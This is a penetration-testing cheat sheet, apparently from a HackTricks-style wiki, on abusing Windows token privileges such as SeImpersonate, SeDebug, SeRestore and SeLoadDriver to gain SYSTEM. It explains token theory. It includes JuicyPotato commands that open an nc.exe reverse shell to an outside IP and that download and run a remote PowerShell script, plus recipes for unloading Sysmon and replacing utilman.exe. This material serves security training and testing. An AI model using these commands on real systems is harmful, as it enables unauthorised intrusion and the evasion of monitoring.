# Abusing Tokens

## Theory

Each user logged onto the system holds an access token with security information for that logon session. The system creates an access token when the user logs on. Every process executed on behalf of the user has a copy of the access token. The token identifies the user, the user's groups, and the user's privileges. A token also contains a logon SID (Security Identifier) that identifies the current logon session.

You can see this information executing `whoami /all`

### Types of tokens

There are two types of tokens available:

* **Primary token**: Primary tokens can only be **associated to processes**, and they represent a process's security subject. The creation of primary tokens and their association to processes are both privileged operations, requiring two different privileges in the name of privilege separation - the typical scenario sees the authentication service creating the token, and a logon service associating it to the user's operating system shell. Processes initially inherit a copy of the parent process's primary token.
*   **Impersonation token**: Impersonation is a security concept implemented in Windows NT that **allows** a server application to **temporarily** "**be**" **the client** in terms of access to secure objects. Impersonation has **four possible levels**:

    * **anonymous**, giving the server the access of an anonymous/unidentified user
    * **identification**, letting the server inspect the client's identity but not use that identity to access objects
    * **impersonation**, letting the server act on behalf of the client
    * **delegation**, same as impersonation but extended to remote systems to which the server connects (through the preservation of credentials).

    The client can choose the maximum impersonation level (if any) available to the server as a connection parameter. Delegation and impersonation are privileged operations (impersonation initially was not, but historical carelessness in the implementation of client APIs failing to restrict the default level to "identification", letting an unprivileged server impersonate an unwilling privileged client, called for it). **Impersonation tokens can only be associated to threads**, and they represent a client process's security subject. Impersonation tokens are usually created and associated to the current thread implicitly, by IPC mechanisms such as DCE RPC, DDE and named pipes.

## Practice

### SeImpersonatePrivilege (3.1.1)

Any process holding this privilege can **impersonate** (but not create) any **token** for which it is able to gethandle. You can get a **privileged token** from a **Windows service** (DCOM) making it perform an **NTLM authentication** against the exploit, then execute a process as **SYSTEM**. Exploit it with [juicy-potato](https://github.com/ohpe/juicy-potato), [RogueWinRM ](https://github.com/antonioCoco/RogueWinRM)(needs winrm disabled), [SweetPotato](https://github.com/CCob/SweetPotato), [PrintSpoofer](https://github.com/itm4n/PrintSpoofer)

{% tabs %}
{% tab title="Juicy-Potato" %}
{% hint style="danger" %}
JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards. However, [PrintSpoofer](https://github.com/itm4n/PrintSpoofer),[RoguePotato](https://github.com/antonioCoco/RoguePotato), [SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato) can be used to leverage the same privileges and gain NT AUTHORITY\SYSTEM
{% endhint %}
[JuicyPotato](https://github.com/ohpe/juicy-potato), a sugared version of RottenPotatoNG. It leverages several COM servers identified by this [CLSID](http://ohpe.it/juicy-potato/CLSID/)

```bash
#nc.exe reverse shell
c:\Users\Public>JuicyPotato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

#Powershell reverse shell
c:\Users\Public>JuicyPotato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```  

{% endtab %}
{% endtabs %}

## Table

Full token privileges cheatsheet at [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin), summary below will only list direct ways to exploit the privilege to obtain an admin session or read sensitive files.\\

| Privilege                  | Impact      | Tool                    | Execution path                                                                                                                                                                                                                                                                                                                                     | Remarks                                                                                                                                                                                                                                                                                                                        |
| -------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | 3rd party tool          | _"It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe, rottenpotato.exe and juicypotato.exe"_                                                                                                                                                                                                      | Thank you [Aurélien Chalot](https://twitter.com/Defte\_) for the update. I will try to re-phrase it to something more recipe-like soon.                                                                                                                                                                                        |
| **`SeBackup`**             | **Threat**  | _**Built-in commands**_ | Read sensitve files with `robocopy /b`                                                                                                                                                                                                                                                                                                             | <p>- May be more interesting if you can read %WINDIR%\MEMORY.DMP<br><br>- <code>SeBackupPrivilege</code> (and robocopy) is not helpful when it comes to open files.<br><br>- Robocopy requires both SeBackup and SeRestore to work with /b parameter.</p>                                                                      |
| **`SeCreateToken`**        | _**Admin**_ | 3rd party tool          | Create arbitrary token including local admin rights with `NtCreateToken`.                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | Duplicate the `lsass.exe` token.                                                                                                                                                                                                                                                                                                                   | Script to be found at [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)                                                                                                                                                                                                         |
| **`SeLoadDriver`**         | _**Admin**_ | 3rd party tool          | <p>1. Load buggy kernel driver such as <code>szkg64.sys</code><br>2. Exploit the driver vulnerability<br><br>Alternatively, the privilege may be used to unload security-related drivers with <code>ftlMC</code> builtin command. i.e.: <code>fltMC sysmondrv</code></p>                                                                           | <p>1. The <code>szkg64</code> vulnerability is listed as <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15732">CVE-2018-15732</a><br>2. The <code>szkg64</code> <a href="https://www.greyhathacker.net/?p=1025">exploit code</a> was created by <a href="https://twitter.com/parvezghh">Parvez Anwar</a></p> |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. Launch PowerShell/ISE with the SeRestore privilege present.<br>2. Enable the privilege with <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Rename utilman.exe to utilman.old<br>4. Rename cmd.exe to utilman.exe<br>5. Lock the console and press Win+U</p> | <p>Attack may be detected by some AV software.</p><p>Alternative method relies on replacing service binaries stored in "Program Files" using the same privilege</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Built-in commands**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icalcs.exe "%windir%\system32" /grant "%username%":F</code><br>3. Rename cmd.exe to utilman.exe<br>4. Lock the console and press Win+U</p>                                                                                                                                       | <p>Attack may be detected by some AV software.</p><p>Alternative method relies on replacing service binaries stored in "Program Files" using the same privilege.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | 3rd party tool          | <p>Manipulate tokens to have local admin rights included. May require SeImpersonate.</p><p>To be verified.</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## Reference

{% embed url="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens" %}